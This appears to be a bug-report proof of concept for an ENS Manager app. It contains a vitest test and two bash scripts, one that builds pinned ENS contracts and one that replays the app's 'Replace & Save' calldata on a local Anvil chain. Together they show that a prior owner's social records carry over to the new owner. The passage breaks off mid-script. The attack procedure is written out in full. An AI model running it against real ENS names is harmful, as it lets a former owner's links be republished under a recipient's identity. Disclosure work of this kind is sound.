Save each block under the displayed filename, make shell files executable, and run the commands in the Proof of Concept section. The blocks are complete; no hidden local path is required.

**Embedded file: `manager-profile-social-carryover-alt.test.tsx`**

```tsx
import { writeFileSync } from 'node:fs'
import { act, cleanup, render, screen, waitFor } from '@testing-library/react'
import React from 'react'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import {
  type Address,
  decodeFunctionData,
  type Hex,
  namehash,
} from 'viem'
import {
  publicResolverMulticallSnippet,
  publicResolverSetTextSnippet,
} from '@ensdomains/ensjs/contracts'
import type { ProfileRecords } from '@/features/profile/types'

const h = vi.hoisted(() => ({
  name: 'recipient.eth',
  owner: '0x1111111111111111111111111111111111111111',
  smartAccount: '0x2222222222222222222222222222222222222222',
  oldResolver: '0x3333333333333333333333333333333333333333',
  newResolver: '0x4444444444444444444444444444444444444444',
  registry: '0x5555555555555555555555555555555555555555',
  signer: { type: 'rhinestone', marker: 'test-signer' },
  publicClient: {
    account: undefined,
    chain: { id: 11155111 },
  },
  pendingSaves: [] as any[],
  startedTransactions: [] as any[],
  mutationErrors: [] as unknown[],
  changedSections: [] as string[],
}))

vi.mock('@lingui/react/macro', () => ({
  Trans: ({ children, message }: any) => children ?? message,
}))

vi.mock('@lingui/react', () => ({
  Trans: ({ children, message }: any) => children ?? message,
  useLingui: () => ({ t: (value: unknown) => value }),
}))

vi.mock('@/components/ui/button', () => ({
  Button: ({ children, disabled, onClick, type = 'button' }: any) => (
    <button disabled={disabled} onClick={onClick} type={type}>
      {children}
    </button>
  ),
}))

vi.mock('@/components/ui/dialog', async () => {
  const React = await vi.importActual<typeof import('react')>('react')
  const DialogContext = React.createContext<{
    open: boolean
    onOpenChange: (open: boolean) => void
  } | null>(null)

  return {
    Dialog: ({ open, onOpenChange, children }: any) => (
      <DialogContext.Provider value={{ open, onOpenChange }}>
        {children}
      </DialogContext.Provider>
    ),
    DialogTrigger: ({ children }: any) => {
      const context = React.useContext(DialogContext)
      if (!React.isValidElement(children)) return children
      return React.cloneElement(children as React.ReactElement<any>, {
        onClick: (event: unknown) => {
          ;(children as React.ReactElement<any>).props.onClick?.(event)
          context?.onOpenChange(true)
        },
      })
    },
    DialogContent: ({ children }: any) => {
      const context = React.useContext(DialogContext)
      return context?.open ? (
        <div data-testid="edit-dialog-content">{children}</div>
      ) : null
    },
  }
})

vi.mock('@/components/ui/alert-dialog', async () => {
  const React = await vi.importActual<typeof import('react')>('react')
  const AlertContext = React.createContext<{ open: boolean } | null>(null)
  const PassThrough = ({ children }: any) => <>{children}</>

  return {
    AlertDialog: ({ open, children }: any) => (
      <AlertContext.Provider value={{ open }}>
        {children}
      </AlertContext.Provider>
    ),
    AlertDialogContent: ({ children }: any) => {
      const context = React.useContext(AlertContext)
      return context?.open ? (
        <div data-testid="setup-confirm">{children}</div>
      ) : null
    },
    AlertDialogDescription: PassThrough,
    AlertDialogFooter: PassThrough,
    AlertDialogHeader: PassThrough,
    AlertDialogTitle: PassThrough,
  }
})

vi.mock('@/components/ui/tabs', () => ({
  Tabs: ({ children }: any) => <div data-testid="general-tab-only">{children}</div>,
}))

vi.mock(
  '@/features/profile/components/dialogs/edit-profile/EditProfileDialogHeader',
  () => ({
    EditProfileDialogHeader: ({ canSave, onSave }: any) => (
      <button disabled={!canSave} onClick={onSave} type="button">
        Save Profile
      </button>
    ),
  }),
)

vi.mock(
  '@/features/profile/components/dialogs/edit-profile/EditProfileDialogTabs',
  () => ({
    EditProfileDialogTabs: ({ onSocialChange, values }: any) => (
      <div>
        <div data-testid="selected-tab">contact</div>
        <button
          onClick={() => {
            h.changedSections.push('contact.com.discord')
            onSocialChange(
              values.social.map((record: { key: string; value: string }) =>
                record.key === 'com.discord'
                  ? { ...record, value: 'recipient-discord' }
                  : record,
              ),
            )
          }}
          type="button"
        >
          Change Discord only
        </button>
      </div>
    ),
  }),
)

vi.mock('@tanstack/react-query', () => ({
  useQuery: () => ({ data: false, isLoading: false }),
  useQueryClient: () => ({ invalidateQueries: vi.fn() }),
  useMutation: (config: any) => ({
    mutate: (variables: any) => {
      if (variables?.pendingSave) h.pendingSaves.push(variables.pendingSave)
      void Promise.resolve(config.mutationFn(variables))
        .then((result) => config.onSuccess?.(result, variables))
        .catch((error) => {
          h.mutationErrors.push(error)
          config.onError?.(error, variables)
        })
    },
    reset: vi.fn(),
  }),
}))

vi.mock('wagmi', () => ({
  useAccount: () => ({ address: h.owner, isConnected: true }),
  useChainId: () => 11155111,
  useSignTypedData: () => ({ signTypedDataAsync: vi.fn() }),
}))

vi.mock('@/lib/smart-account', () => ({
  useSmartAccountContext: () => ({
    accountAddress: h.smartAccount,
    ownerAddress: h.owner,
    signer: h.signer,
    walletClient: {
      account: { address: h.owner },
      chain: { id: 11155111 },
    },
  }),
}))

vi.mock('@/lib/wagmi', () => ({
  publicClient: h.publicClient,
  sepoliaWithEns: { id: 11155111 },
}))

vi.mock('@/features/profile/service/resolverWriteAccess', () => ({
  resolverWriteAccessQuery: (name: string) => ({
    queryKey: ['resolver-write-access', name],
    queryFn: vi.fn(),
  }),
}))

vi.mock('@/features/profile/service/profileImageCache', () => ({
  getActiveSignedProfileImageUploads: () => [],
  refreshProfileImageCaches: vi.fn(async () => undefined),
}))

vi.mock('@/features/profile/service/profileImageUpload', () => ({
  submitPreparedProfileImageUpload: vi.fn(async () => undefined),
}))

vi.mock('@/features/migration/service/ensureOwnedPermRes', () => ({
  buildDeployOwnedPermResCall: vi.fn(() => ({
    to: h.registry,
    data: '0xdead',
    value: 0n,
  })),
  findExistingPermRes: vi.fn(async () => h.newResolver),
  simulateOwnedPermResAddress: vi.fn(async () => h.newResolver),
}))

vi.mock('@/features/profile/service/changeResolver', () => ({
  buildSetResolverCall: vi.fn(() => ({
    to: h.registry,
    data: '0xbeef',
    value: 0n,
  })),
}))

vi.mock('@ens-apps/transaction-manager', () => ({
  getSmartAccountAddress: () => h.smartAccount,
  transactionManager: {
    startTransaction: vi.fn((input: any, signer: any, metadata: any) => {
      h.startedTransactions.push({ input, signer, metadata })
      return `profile-alt-tx-${h.startedTransactions.length}`
    }),
  },
  waitForTransaction: vi.fn(async () => ({ hash: '0x1234' })),
}))

vi.mock('sonner', () => ({ toast: { error: vi.fn() } }))

import { EditProfileDialog } from '@/features/profile/components/dialogs/edit-profile/EditProfileDialog'
import { getPrimaryContactItems } from '@/features/profile/components/view/ProfileView.helpers'
import {
  newEmptyProfileRecords,
  normalizeProfileRecords,
  transformProfileRecords,
} from '@/features/profile/utils/transformRecords'

const positiveSocials = [
  ['com.twitter', 'https://twitter.com/attacker'],
  ['org.telegram', 'https://t.me/attacker'],
  ['xyz.farcaster', 'https://farcaster.xyz/attacker'],
  ['com.instagram', 'https://instagram.com/attacker'],
  ['com.github', 'https://github.com/attacker'],
  ['com.linkedin', 'https://linkedin.com/in/attacker'],
  ['com.reddit', 'https://reddit.com/user/attacker'],
  ['com.tiktok', 'https://tiktok.com/@attacker'],
  ['com.twitch', 'https://twitch.tv/attacker'],
] as const

const controlSocials = [
  ['com.discord', 'attacker-control'],
  ['com.youtube', 'attacker-control'],
  ['com.mastodon', 'attacker-control'],
] as const

const makeRecords = (canonical: boolean): ProfileRecords => ({
  ...newEmptyProfileRecords(),
  resolverAddress: h.oldResolver as Address,
  base: { description: 'previous-owner description' },
  social: [
    ...positiveSocials.map(([key, rawValue]) => ({
      key,
      value: canonical ? 'attacker' : rawValue,
    })),
    ...controlSocials.map(([key, value]) => ({ key, value })),
  ],
})

interface DecodedTextWrite {
  readonly node: Hex
  readonly key: string
  readonly value: string
}

const decodeTextWrites = (data: Hex): DecodedTextWrite[] => {
  const selector = data.slice(0, 10)
  const multicallSelector = '0xac9650d8'
  const encodedCalls =
    selector === multicallSelector
      ? ((decodeFunctionData({
          abi: publicResolverMulticallSnippet,
          data,
        }).args?.[0] ?? []) as readonly Hex[])
      : [data]

  return encodedCalls.map((encoded) => {
    const decoded = decodeFunctionData({
      abi: publicResolverSetTextSnippet,
      data: encoded,
    })
    const [node, key, value] = decoded.args as readonly [Hex, string, string]
    return { node, key, value }
  })
}

const runDiscordOnlySave = async (records: ProfileRecords) => {
  render(
    <EditProfileDialog
      name={h.name}
      onUpdated={vi.fn()}
      owner={h.owner as Address}
      records={records}
      trigger={<button type="button">Edit Profile</button>}
    />,
  )

  act(() => screen.getByText('Edit Profile').click())
  expect(screen.getByTestId('general-tab-only')).toBeTruthy()

  expect(screen.getByTestId('selected-tab').textContent).toBe('contact')
  act(() => screen.getByText('Change Discord only').click())
  expect(h.changedSections).toEqual(['contact.com.discord'])

  act(() => screen.getByText('Save Profile').click())
  const confirmation = screen.getByTestId('setup-confirm')
  expect(confirmation.textContent).toContain(
    'clears them and keeps only the changes you save',
  )
  expect(confirmation.textContent).not.toContain('attacker')
  expect(confirmation.textContent).not.toContain('com.twitter')

  act(() => screen.getByText('Replace & Save').click())
  await waitFor(() => expect(h.startedTransactions).toHaveLength(1))
  expect(h.mutationErrors).toEqual([])

  const pendingSave = h.pendingSaves[0]
  const request = h.startedTransactions[0].input.request
  const calls = request.rhinestoneParams.calls as Array<{
    to: Address
    data: Hex
    value: bigint
  }>
  const recordCall = calls.find(
    ({ to }) => to.toLowerCase() === h.newResolver.toLowerCase(),
  )
  expect(recordCall).toBeTruthy()

  return {
    calls,
    pendingSave,
    recordCall: recordCall!,
    writes: decodeTextWrites(recordCall!.data),
  }
}

describe('ALT route: Contact-tab edit carries untouched normalized socials', () => {
  beforeEach(() => {
    h.pendingSaves.length = 0
    h.startedTransactions.length = 0
    h.mutationErrors.length = 0
    h.changedSections.length = 0
    vi.clearAllMocks()
  })

  afterEach(() => cleanup())

  it('re-authors nine untouched socials when only Discord is changed', async () => {
    const rawRecords = makeRecords(false)
    const { calls, pendingSave, recordCall, writes } =
      await runDiscordOnlySave(rawRecords)

    expect(pendingSave.kind).toBe('setup')
    expect(pendingSave.name).toBe(h.name)
    expect(pendingSave.before.texts).toEqual(
      expect.arrayContaining(
        positiveSocials.map(([key, value]) => ({ key, value })),
      ),
    )
    expect(pendingSave.after.texts).toEqual(
      expect.arrayContaining(
        positiveSocials.map(([key]) => ({ key, value: 'attacker' })),
      ),
    )
    expect(pendingSave.after.texts).toEqual(
      expect.arrayContaining([{ key: 'com.discord', value: 'recipient-discord' }]),
    )

    expect(calls).toHaveLength(2)
    expect(writes).toHaveLength(10)
    expect(writes.map(({ key }) => key)).toEqual([
      ...positiveSocials.map(([key]) => key),
      'com.discord',
    ])
    expect(writes.filter(({ key }) => key !== 'com.discord')).toEqual(
      positiveSocials.map(([key]) => ({
        node: namehash(h.name),
        key,
        value: 'attacker',
      })),
    )
    expect(writes.at(-1)).toEqual({
      node: namehash(h.name),
      key: 'com.discord',
      value: 'recipient-discord',
    })
    expect(writes.map(({ key }) => key)).not.toContain('com.youtube')
    expect(writes.map(({ key }) => key)).not.toContain('com.mastodon')

    const reloaded = transformProfileRecords({
      resolverAddress: h.newResolver as Address,
      coins: [],
      texts: writes.map(({ key, value }) => ({ key, value })),
    })
    expect(getPrimaryContactItems(reloaded).map(({ key }) => key)).toEqual(
      positiveSocials.slice(0, 3).map(([key]) => key),
    )

    console.log(
      'ALT_ROUTE_DECODED_UNINTENDED_WRITES',
      JSON.stringify({
        confirmationOmittedSocials: true,
        changedSections: h.changedSections,
        recordCalldata: recordCall.data,
        writes,
        fallbackPrimaryContacts: getPrimaryContactItems(reloaded).map(
          ({ key, displayValue, href }) => ({ key, displayValue, href }),
        ),
      }),
    )

    const artifactPath = process.env.ALT_ROUTE_ARTIFACT
    if (artifactPath) {
      writeFileSync(
        artifactPath,
        JSON.stringify(
          {
            route: 'contact-tab-com.discord-edit',
            source_commit: '1c9b47f18fcddd2e864dfe385c4171061c9811ae',
            confirmation_omitted_socials: true,
            changed_sections: h.changedSections,
            record_calldata: recordCall.data,
            writes,
            fallback_primary_contacts: getPrimaryContactItems(reloaded).map(
              ({ key, displayValue, href }) => ({ key, displayValue, href }),
            ),
          },
          null,
          2,
        ),
      )
    }
  })

  it('emits only Discord when the saved baseline is already canonical', async () => {
    const { pendingSave, recordCall, writes } =
      await runDiscordOnlySave(makeRecords(true))

    expect(pendingSave.before.texts).toEqual(
      expect.arrayContaining(
        positiveSocials.map(([key]) => ({ key, value: 'attacker' })),
      ),
    )
    expect(writes).toEqual([
      {
        node: namehash(h.name),
        key: 'com.discord',
        value: 'recipient-discord',
      },
    ])

    console.log(
      'ALT_ROUTE_DECODED_CANONICAL_CONTROL',
      JSON.stringify({ recordCalldata: recordCall.data, writes }),
    )
  })

  it('confirms the nested Twitter normalizer is not idempotent', () => {
    const normalizeTwitter = (value: string) =>
      normalizeProfileRecords({
        ...newEmptyProfileRecords(),
        social: [{ key: 'com.twitter', value }],
      }).social[0]!.value

    const raw = 'https://x.com/x.com%2Fx.com%252Fattacker'
    const once = normalizeTwitter(raw)
    const twice = normalizeTwitter(once)
    const threeTimes = normalizeTwitter(twice)

    expect([once, twice, threeTimes]).toEqual([
      'x.com/x.com%2Fattacker',
      'x.com/attacker',
      'attacker',
    ])
  })
})
```

**Embedded file: `setup-poc-env-profile-alt.sh`**

```bash
#!/usr/bin/env bash
# profile-alt hardened PoC — one-time canonical-contract environment builder.
#
# Builds contracts/poc-env next to this script:
#   - ens-contracts @ 5141a2acdf77cf49f5134d674c2792b30f5ee0db (64-file source
#     subset — exactly the files the reference build used)
#   - openzeppelin-contracts v4.9.3 (git clone, tag layout keeps contracts/,
#     which the @openzeppelin/ remapping requires; the npm tarball flattens it)
#   - @ensdomains/buffer 0.1.3 and @ensdomains/solsha1 0.0.3 (npm tarballs;
#     ens-contracts' dependency spec for buffer is ^0.1.3)
#   - foundry.toml (solc 0.8.26, evm cancun)
# then compiles with forge build.
#
# Requires: git, node/npm, foundry (forge).
set -euo pipefail
export PATH="$HOME/.foundry/bin:$PATH"

WS_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ENV_DIR="$WS_DIR/contracts/poc-env"
ENS_COMMIT=5141a2acdf77cf49f5134d674c2792b30f5ee0db

if [ -f "$ENV_DIR/out/PublicResolver.sol/PublicResolver.json" ]; then
  echo "[*] contracts/poc-env already built; nothing to do"
  exit 0
fi

TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

echo "=== [1/4] fetch ens-contracts @ $ENS_COMMIT"
mkdir -p "$TMP/ens-contracts"
(
  cd "$TMP/ens-contracts"
  git init -q
  git remote add origin https://github.com/ensdomains/ens-contracts.git
  git fetch -q --depth 1 origin "$ENS_COMMIT"
  git checkout -q FETCH_HEAD
)

echo "=== [2/4] stage the exact 64-file source subset into contracts/poc-env/src"
mkdir -p "$ENV_DIR/src" "$ENV_DIR/lib"
SRC_FILES="
ccipRead/CCIPBatcher.sol
ccipRead/CCIPReader.sol
ccipRead/EIP3668.sol
ccipRead/IBatchGateway.sol
dnssec-oracle/RRUtils.sol
ethregistrar/IBaseRegistrar.sol
registry/ENS.sol
registry/ENSRegistry.sol
resolvers/IMulticallable.sol
resolvers/Multicallable.sol
resolvers/PublicResolver.sol
resolvers/ResolverBase.sol
resolvers/profiles/ABIResolver.sol
resolvers/profiles/AddrResolver.sol
resolvers/profiles/ContentHashResolver.sol
resolvers/profiles/DNSResolver.sol
resolvers/profiles/DataResolver.sol
resolvers/profiles/ExtendedDNSResolver.sol
resolvers/profiles/ExtendedResolver.sol
resolvers/profiles/IABIResolver.sol
resolvers/profiles/IAddrResolver.sol
resolvers/profiles/IAddressResolver.sol
resolvers/profiles/ICompositeResolver.sol
resolvers/profiles/IContentHashResolver.sol
resolvers/profiles/IDNSRecordResolver.sol
resolvers/profiles/IDNSZoneResolver.sol
resolvers/profiles/IDataResolver.sol
resolvers/profiles/IExtendedDNSResolver.sol
resolvers/profiles/IExtendedResolver.sol
resolvers/profiles/IHasAddressResolver.sol
resolvers/profiles/IInterfaceResolver.sol
resolvers/profiles/INameResolver.sol
resolvers/profiles/IPubkeyResolver.sol
resolvers/profiles/ISupportedDataKeys.sol
resolvers/profiles/ITextResolver.sol
resolvers/profiles/IVerifiableResolver.sol
resolvers/profiles/IVersionableResolver.sol
resolvers/profiles/InterfaceResolver.sol
resolvers/profiles/NameResolver.sol
resolvers/profiles/PubkeyResolver.sol
resolvers/profiles/SupportedDataKeys.sol
resolvers/profiles/TextResolver.sol
reverseRegistrar/IReverseRegistrar.sol
reverseRegistrar/ReverseClaimer.sol
reverseRegistrar/ReverseRegistrar.sol
root/Controllable.sol
utils/AddressUtils.sol
utils/BytesUtils.sol
utils/BytesUtils_LEGACY.sol
utils/ENSIP19.sol
utils/ERC20Recoverable.sol
utils/HexUtils.sol
utils/IERC7996.sol
utils/LibABI.sol
utils/LibMem/LibMem.sol
utils/LowLevelCallUtils.sol
utils/MigrationHelper.sol
utils/NameCoder.sol
utils/StringUtils.sol
utils/UniversalSigValidator.sol
wrapper/Controllable.sol
wrapper/IMetadataService.sol
wrapper/INameWrapper.sol
wrapper/INameWrapperUpgrade.sol
"
for f in $SRC_FILES; do
  mkdir -p "$ENV_DIR/src/$(dirname "$f")"
  cp "$TMP/ens-contracts/contracts/$f" "$ENV_DIR/src/$f"
done
test "$(find "$ENV_DIR/src" -type f | wc -l)" -eq 64

cat > "$ENV_DIR/foundry.toml" <<'EOF'
[profile.default]
src = "src"
out = "out"
libs = ["lib"]
solc = "0.8.26"
evm_version = "cancun"
remappings = [
  "@openzeppelin/=lib/openzeppelin-contracts/",
  "@ensdomains/buffer/=lib/buffer/",
  "@ensdomains/solsha1/=lib/solsha1/",
  "contracts/=src/",
]
EOF

echo "=== [3/4] vendor lib dependencies (pinned versions)"
(
  cd "$TMP"
  git clone -q --depth 1 --branch v4.9.3 \
    https://github.com/OpenZeppelin/openzeppelin-contracts.git ozc
  cp -R ozc "$ENV_DIR/lib/openzeppelin-contracts"
  npm pack --silent @ensdomains/buffer@0.1.3
  mkdir -p buf && tar -xzf ensdomains-buffer-0.1.3.tgz -C buf
  cp -R buf/package "$ENV_DIR/lib/buffer"
  npm pack --silent @ensdomains/solsha1@0.0.3
  mkdir -p sha && tar -xzf ensdomains-solsha1-0.0.3.tgz -C sha
  cp -R sha/package "$ENV_DIR/lib/solsha1"
)

echo "=== [4/4] forge build (solc 0.8.26)"
(cd "$ENV_DIR" && forge build --quiet)
for f in ENSRegistry.sol/ENSRegistry PublicResolver.sol/PublicResolver ReverseRegistrar.sol/ReverseRegistrar; do
  test -f "$ENV_DIR/out/$f.json" || { echo "[!] missing artifact $f" >&2; exit 1; }
done
echo "[*] contracts/poc-env ready"
```

**Embedded file: `onchain-lifecycle-alt.sh`**

```bash
#!/usr/bin/env bash
# Alternative-route PoC: a Contact-tab Discord edit on a local Anvil chain.
#
#   attacker (prior owner) seeds non-canonical social records on the old resolver
#   -> transfers recipient.eth to recipient
#   -> recipient points the name at a fresh replacement resolver
#   -> recipient changes only com.discord in Manager's Contact tab
#   -> recipient executes the EXACT multicall bytes built by the real Manager
#      Edit Profile "Replace & Save" flow (captured from the alternative test)
#   -> reads back every text record from both resolvers and writes
#      onchain-end-state.json
#
# Usage: onchain-lifecycle-alt.sh <rpc-url> <app-built.json> <out.json> [logfile]
set -euo pipefail
export PATH="$HOME/.foundry/bin:$PATH"
# System HTTP proxies can intercept reqwest/alloy traffic even for loopback;
# cast/curl must bypass them explicitly.
export NO_PROXY="127.0.0.1,localhost" no_proxy="127.0.0.1,localhost"

RPC_URL="$1"
APP_BUILT_JSON="$2"
OUT_JSON="$3"
LOG="${4:-/dev/null}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WS_DIR="$SCRIPT_DIR"
POC_ENV="$WS_DIR/contracts/poc-env"

exec > >(tee -a "$LOG") 2>&1

# --- anvil deterministic accounts -----------------------------------------
DEPLOYER_PK=0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a
DEPLOYER=0x3c44cdddb6a900fa2b585dd299e03d12fa4293bc
ATTACKER_PK=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
ATTACKER=0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
RECIPIENT_PK=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
RECIPIENT=0x70997970c51812dc3a010c7d01b50e0d17dc79c8

NAME=recipient.eth
NODE=$(cast namehash "$NAME")
ETH_NODE=$(cast namehash eth)
ETH_LABEL=$(cast keccak "eth")
RECIPIENT_LABEL=$(cast keccak "recipient")
ZERO32=0x0000000000000000000000000000000000000000000000000000000000000000

echo "[*] rpc=$RPC_URL node=$NODE"
echo "[*] deployer=$DEPLOYER attacker=$ATTACKER recipient=$RECIPIENT"

# --- sanity: anvil is up and fresh -----------------------------------------
CHAIN_ID=$(cast chain-id --rpc-url "$RPC_URL")
BLOCK0=$(cast block-number --rpc-url "$RPC_URL")
echo "[*] chain-id=$CHAIN_ID start-block=$BLOCK0"

# --- deploy canonical ENSRegistry + two canonical PublicResolver ------------
REGISTRY_BC=$(jq -r '.bytecode.object' "$POC_ENV/out/ENSRegistry.sol/ENSRegistry.json")
RESOLVER_BC=$(jq -r '.bytecode.object' "$POC_ENV/out/PublicResolver.sol/PublicResolver.json")
REVREG_BC=$(jq -r '.bytecode.object' "$POC_ENV/out/ReverseRegistrar.sol/ReverseRegistrar.json")

send_create() { # bytecode args... -> prints deployed address
  local bc="$1"; shift
  local args=""
  if [ "$#" -gt 0 ]; then
    args=$(cast abi-encode "$@")
  fi
  cast send --rpc-url "$RPC_URL" --private-key "$DEPLOYER_PK" \
    --create "${bc}${args#0x}" --json | jq -r '.contractAddress'
}

REGISTRY=$(send_create "$REGISTRY_BC")
echo "[*] ENSRegistry deployed at $REGISTRY"

# Canonical PublicResolver's ReverseClaimer constructor requires a real
# contract at addr.reverse; deploy the canonical ReverseRegistrar and wire it.
REV_REGISTRAR=$(send_create "$REVREG_BC" "f(address)" "$REGISTRY")
REV_NODE=$(cast namehash reverse)
ADDR_REV_NODE=0x91d1777781884d03a6757a803996e38de2a42967fb37eeaca72729271025a9e2
cast send --rpc-url "$RPC_URL" --private-key "$DEPLOYER_PK" "$REGISTRY" \
  "setSubnodeOwner(bytes32,bytes32,address)" "$ZERO32" "$(cast keccak reverse)" "$DEPLOYER" >/dev/null
cast send --rpc-url "$RPC_URL" --private-key "$DEPLOYER_PK" "$REGISTRY" \
  "setSubnodeOwner(bytes32,bytes32,address)" "$REV_NODE" "$(cast keccak addr)" "$REV_REGISTRAR" >/dev/null
echo "[*] ReverseRegistrar at $REV_REGISTRAR (wired at addr.reverse)"

OLD_RESOLVER=$(send_create "$RESOLVER_BC" "f(address,address,address,address)" "$REGISTRY" 0x0000000000000000000000000000000000000000 0x0000000000000000000000000000000000000000 0x0000000000000000000000000000000000000000)
NEW_RESOLVER=$(send_create "$RESOLVER_BC" "f(address,address,address,address)" "$REGISTRY" 0x0000000000000000000000000000000000000000 0x0000000000000000000000000000000000000000 0x0000000000000000000000000000000000000000)
echo "[*] old resolver (inherited, attacker-era) at $OLD_RESOLVER"
echo "[*] new resolver (replacement)           at $NEW_RESOLVER"

# --- register the 2LD: attacker owns recipient.eth on the old resolver ------
cast send --rpc-url "$RPC_URL" --private-key "$DEPLOYER_PK" "$REGISTRY" \
  "setSubnodeOwner(bytes32,bytes32,address)" "$ZERO32" "$ETH_LABEL" "$DEPLOYER" >/dev/null
cast send --rpc-url "$RPC_URL" --private-key "$DEPLOYER_PK" "$REGISTRY" \
  "setSubnodeRecord(bytes32,bytes32,address,address,uint64)" \
  "$ETH_NODE" "$RECIPIENT_LABEL" "$ATTACKER" "$OLD_RESOLVER" 0 >/dev/null
echo "[*] $NAME registered: owner=attacker resolver=old"

# --- attacker seeds the raw, non-canonical baseline (pre-transfer state) ----
seed_text() { # key value
  cast send --rpc-url "$RPC_URL" --private-key "$ATTACKER_PK" "$OLD_RESOLVER" \
    "setText(bytes32,string,string)" "$NODE" "$1" "$2" >/dev/null
}
seed_text "com.twitter"    "https://twitter.com/attacker"
seed_text "org.telegram"   "https://t.me/attacker"
seed_text "xyz.farcaster"  "https://farcaster.xyz/attacker"
seed_text "com.instagram"  "https://instagram.com/attacker"
seed_text "com.github"     "https://github.com/attacker"
seed_text "com.linkedin"   "https://linkedin.com/in/attacker"
seed_text "com.reddit"     "https://reddit.com/user/attacker"
seed_text "com.tiktok"     "https://tiktok.com/@attacker"
seed_text "com.twitch"     "https://twitch.tv/attacker"
seed_text "com.discord"    "attacker-control"
seed_text "com.youtube"    "attacker-control"
seed_text "com.mastodon"   "attacker-control"
seed_text "description"    "previous-owner description"
echo "[*] attacker seeded 13 raw text records on old resolver"

# --- transfer the name to the recipient -------------------------------------
cast send --rpc-url "$RPC_URL" --private-key "$ATTACKER_PK" "$REGISTRY" \
  "setOwner(bytes32,address)" "$NODE" "$RECIPIENT" >/dev/null
echo "[*] ownership transferred attacker -> recipient"
echo "[*] owner now: $(cast call --rpc-url "$RPC_URL" "$REGISTRY" "owner(bytes32)(address)" "$NODE")"

# --- Replace & Save: recipient swaps resolver, then executes the app bytes --
APP_CALLDATA=$(jq -r '.record_calldata // .recordCalldata' "$APP_BUILT_JSON")
APP_TARGET_NODE=$(jq -r '.writes[0].node' "$APP_BUILT_JSON")
if [ "$(echo "$APP_TARGET_NODE" | tr 'A-F' 'a-f')" != "$(echo "$NODE" | tr 'A-F' 'a-f')" ]; then
  echo "[!] FATAL: app calldata node $APP_TARGET_NODE != on-chain node $NODE" >&2
  exit 1
fi

SET_RESOLVER_TX=$(cast send --rpc-url "$RPC_URL" --private-key "$RECIPIENT_PK" "$REGISTRY" \
  "setResolver(bytes32,address)" "$NODE" "$NEW_RESOLVER" --json | jq -r '.transactionHash')
echo "[*] recipient setResolver -> new resolver (tx $SET_RESOLVER_TX)"

# THE app-built transaction: exact multicall(bytes[]) bytes from the real
# Manager dialog/service/ensjs builder, sent by the recipient to the new resolver.
APP_TX=$(cast send --rpc-url "$RPC_URL" --private-key "$RECIPIENT_PK" \
  "$NEW_RESOLVER" "$APP_CALLDATA" --json | jq -r '.transactionHash')
APP_TX_STATUS=$(cast receipt --rpc-url "$RPC_URL" "$APP_TX" status | tr -d ' ')
echo "[*] app-built multicall mined (tx $APP_TX status=$APP_TX_STATUS)"
case "$APP_TX_STATUS" in true|1*|0x1) ;; *) echo "[!] FATAL: app multicall reverted" >&2; exit 1;; esac

# Prove byte-identity: the mined transaction input IS the app-built calldata.
MINED_INPUT=$(cast tx --rpc-url "$RPC_URL" "$APP_TX" input)
if [ "$MINED_INPUT" != "$APP_CALLDATA" ]; then
  echo "[!] FATAL: mined tx input differs from app-built calldata" >&2
  exit 1
fi
echo "[*] mined tx input is byte-identical to the app-built multicall (${#APP_CALLDATA} hex chars)"

# --- read back the settled end state ----------------------------------------
read_text() { # resolver key
  cast call --rpc-url "$RPC_URL" "$1" "text(bytes32,string)(string)" "$NODE" "$2" \
    | sed -e 's/^"//' -e 's/"$//'
}

NEW_JSON=$(jq -n '{}')
for k in com.twitter org.telegram xyz.farcaster com.instagram com.github com.linkedin com.reddit com.tiktok com.twitch com.discord com.youtube com.mastodon description; do
  NEW_JSON=$(jq --arg k "$k" --arg v "$(read_text "$NEW_RESOLVER" "$k")" '. + {($k): $v}' <<<"$NEW_JSON")
done
OLD_JSON=$(jq -n '{}')
for k in com.twitter org.telegram xyz.farcaster com.instagram com.github com.linkedin com.reddit com.tiktok com.twitch com.discord com.youtube com.mastodon description; do
  OLD_JSON=$(jq --arg k "$k" --arg v "$(read_text "$OLD_RESOLVER" "$k")" '. + {($k): $v}' <<<"$OLD_JSON")
done

FINAL_BLOCK=$(cast block-number --rpc-url "$RPC_URL")
OWNER_NOW=$(cast call --rpc-url "$RPC_URL" "$REGISTRY" "owner(bytes32)(address)" "$NODE")
RESOLVER_NOW=$(cast call --rpc-url "$RPC_URL" "$REGISTRY" "resolver(bytes32)(address)" "$NODE")

for k in com.twitter org.telegram xyz.farcaster com.instagram com.github com.linkedin com.reddit com.tiktok com.twitch; do
  test "$(jq -r --arg k "$k" '.[$k]' <<<"$NEW_JSON")" = "attacker"
done
test "$(jq -r '.["com.discord"]' <<<"$NEW_JSON")" = "recipient-discord"
test "$(jq -r '.["com.youtube"]' <<<"$NEW_JSON")" = ""
test "$(jq -r '.["com.mastodon"]' <<<"$NEW_JSON")" = ""
test "$(jq -r '.description' <<<"$NEW_JSON")" = ""

jq -n \
  --arg name "$NAME" --arg node "$NODE" --arg chainId "$CHAIN_ID" \
  --arg registry "$REGISTRY" --arg oldResolver "$OLD_RESOLVER" --arg newResolver "$NEW_RESOLVER" \
  --arg attacker "$ATTACKER" --arg recipient "$RECIPIENT" --arg deployer "$DEPLOYER" \
  --arg setResolverTx "$SET_RESOLVER_TX" --arg appTx "$APP_TX" \
  --arg minedInput "$MINED_INPUT" \
  --arg ownerNow "$OWNER_NOW" --arg resolverNow "$RESOLVER_NOW" \
  --argjson startBlock "$BLOCK0" --argjson finalBlock "$FINAL_BLOCK" \
  --argjson appCalldata "$(jq '.record_calldata // .recordCalldata' "$APP_BUILT_JSON")" \
  --argjson oldTexts "$OLD_JSON" --argjson newTexts "$NEW_JSON" \
  '{
    route: "contact-tab-com.discord-edit",
    name: $name, node: $node, chain_id: ($chainId|tonumber),
    contracts: { registry: $registry, old_resolver: $oldResolver, new_resolver: $newResolver },
    actors: { deployer: $deployer, attacker_prior_owner: $attacker, recipient_new_owner: $recipient },
    transactions: { set_resolver: $setResolverTx, app_built_multicall: $appTx },
    app_built_record_calldata: $appCalldata,
    mined_tx_input: $minedInput,
